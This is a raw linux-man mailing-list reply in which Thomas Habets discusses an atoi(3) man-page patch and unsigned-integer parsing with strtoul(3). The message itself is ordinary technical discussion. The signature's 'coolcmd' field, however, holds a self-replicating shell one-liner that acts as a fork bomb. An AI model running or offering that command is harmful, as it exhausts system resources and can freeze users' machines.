Return-Path: <linux-man+bounces-247-lists+linux-man=lfdr.de@vger.kernel.org>
X-Original-To: lists+linux-man@lfdr.de
Delivered-To: lists+linux-man@lfdr.de
Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [IPv6:2604:1380:4601:e00::3])
	by mail.lfdr.de (Postfix) with ESMTPS id 7B03280C74D
	for <lists+linux-man@lfdr.de>; Mon, 11 Dec 2023 11:53:42 +0100 (CET)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by am.mirrors.kernel.org (Postfix) with ESMTPS id 25E9E1F2116F
	for <lists+linux-man@lfdr.de>; Mon, 11 Dec 2023 10:53:42 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id C9C562D612;
	Mon, 11 Dec 2023 10:53:36 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=habets.se header.i=@habets.se header.b="VE7CU1pL"
X-Original-To: linux-man@vger.kernel.org
Received: from mail-ed1-x52c.google.com (mail-ed1-x52c.google.com [IPv6:2a00:1450:4864:20::52c])
	by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 675299A
	for <linux-man@vger.kernel.org>; Mon, 11 Dec 2023 02:53:33 -0800 (PST)
Received: by mail-ed1-x52c.google.com with SMTP id 4fb4d7f45d1cf-548f853fc9eso6050107a12.1
        for <linux-man@vger.kernel.org>; Mon, 11 Dec 2023 02:53:33 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=habets.se; s=google; t=1702292012; x=1702896812; darn=vger.kernel.org;
        h=cc:to:subject:message-id:date:references:mime-version:in-reply-to
         :from:from:to:cc:subject:date:message-id:reply-to;
        bh=JmUD7uS++z3GKOEASO5OdAsaIVoRTohpVbHFL1986EI=;
        b=VE7CU1pLC58qssqa6zV1GP2yyEaSgz9DdYzHNyimmmZR26RLYpqpPmUre/L5bfLMUa
         Na/DdvAWU4/GyqPnIW9tdntdCfdP5YoYgGMxwNOEUHZ2NqU0t4pyXRg9zAzDwjWjcM59
         zcTooKE6i6lPoQTu6FifwR9Cv3IRMN6qtMMKs=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1702292012; x=1702896812;
        h=cc:to:subject:message-id:date:references:mime-version:in-reply-to
         :from:x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=JmUD7uS++z3GKOEASO5OdAsaIVoRTohpVbHFL1986EI=;
        b=YwGtNWycR1FOZbYto1BysnC0uqQqO0U2QbYaLsFP8MH72btpFPXIEhlqD5k1WNJQ4v
         rLlpCO0bpjpU1B/FdUeiusvsw3jctVKvKX8TaLQbIN0g/S054qjSiQvmp7XSQ2PjUWJM
         2Uc/e6AASJ1FRw7Xz7fCJtqfJpb3bOrMS6djoShM5SXLbA/ohkkJABUfP1O4Ha8uB6lR
         XkFkZ+yqLKr3KVAXRdxd7VJrMEDpgfHX6gSE65rdh3OFrg9eI++UkNoVl1kqO/Th3yxb
         51hOADXDVL5jSOLqQ4cI57B1CXJfQ0NFNFuzvChtwoz5zxltCFq2W8osWiamTEPrYush
         8raA==
X-Gm-Message-State: AOJu0YyIurox//omqQM6nXRGmYfHTtxyPKQ3ff6a8TcDiWx0bPWY0gYn
	BSG/FCxXhEK3GVuNlu1/uUv00MVlToHl/Cmuy2mPbw==
X-Google-Smtp-Source: AGHT+IEyG9i+DdQR28EoZfPUUbZPkKT7UAQd1vTDjW4AV1wmwzHazaoHdry0VMApOW/bbd4PC+b3L6C0ZKMSFPL+0M4=
X-Received: by 2002:a50:e60b:0:b0:54c:4fec:11a with SMTP id
 y11-20020a50e60b000000b0054c4fec011amr1443414edm.169.1702292011678; Mon, 11
 Dec 2023 02:53:31 -0800 (PST)
Received: from 195210475306 named unknown by gmailapi.google.com with
 HTTPREST; Mon, 11 Dec 2023 02:53:31 -0800
From: Thomas Habets <thomas@habets.se>
In-Reply-To: <ZXZOB0STGjxX3aH0@debian>
Precedence: bulk
X-Mailing-List: linux-man@vger.kernel.org
List-Id: <linux-man.vger.kernel.org>
List-Subscribe: <mailto:linux-man+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-man+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <CA+kHd+cpgbREUpfm+xBJkhUNc52n1juM3gF_M+8_Wo3AU6wdEw@mail.gmail.com>
 <ZXYhCo6s-usIn-9d@debian> <CA+kHd+eOibN0vynr5WdBHQKfMSMBBC_tS+24_771475yYt_SqQ@mail.gmail.com>
 <ZXZOB0STGjxX3aH0@debian>
Date: Mon, 11 Dec 2023 02:53:31 -0800
Message-ID: <CA+kHd+e1SQK1pVb5Uekc7y52QCH6c_qOM89D_8_dUcctsDD5rQ@mail.gmail.com>
Subject: Re: [patch] atoi.3: Document return value on under/overflow as undefined
To: Alejandro Colomar <alx@kernel.org>
Cc: linux-man@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"

On Sun, 10 Dec 2023 23:47:19 +0000, Alejandro Colomar <alx@kernel.org> said:
> Yeah, I'm thinking in 50 years from now, assuming all implementations
> have good intentions and don't want to break programs just because the
> standard says they can.  Hopefully atoi(3) could be usable in half a
> century; if the planet is still there.

Sure, one can lead by example. I wouldn't hold my breath that everyone
follows, though. I definitely predict maintainers (cough, some BSDs,
cough) saying "nobody should use ato*() anyway".

> BTW, regarding your blog post about strtoul(3), I don't think it's so
> hard to parse unsigned integers.  I couldn't reply to your blong without
> logging in, but replied to the linked SO post:
> <https://softwareengineering.stackexchange.com/a/449060/332848>

Ah, parse it twice to check. Yeah I'd not thought of that. Thanks. I'll add an
update.

--
typedef struct me_s {
  char name[]      = { "Thomas Habets" };
  char email[]     = { "thomas@habets.se" };
  char kernel[]    = { "Linux" };
  char *pgpKey[]   = { "http://www.habets.pp.se/pubkey.txt" };
  char pgp[] = { "9907 8698 8A24 F52F 1C2E  87F6 39A4 9EEA 460A 0169" };
  char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
} me_t;

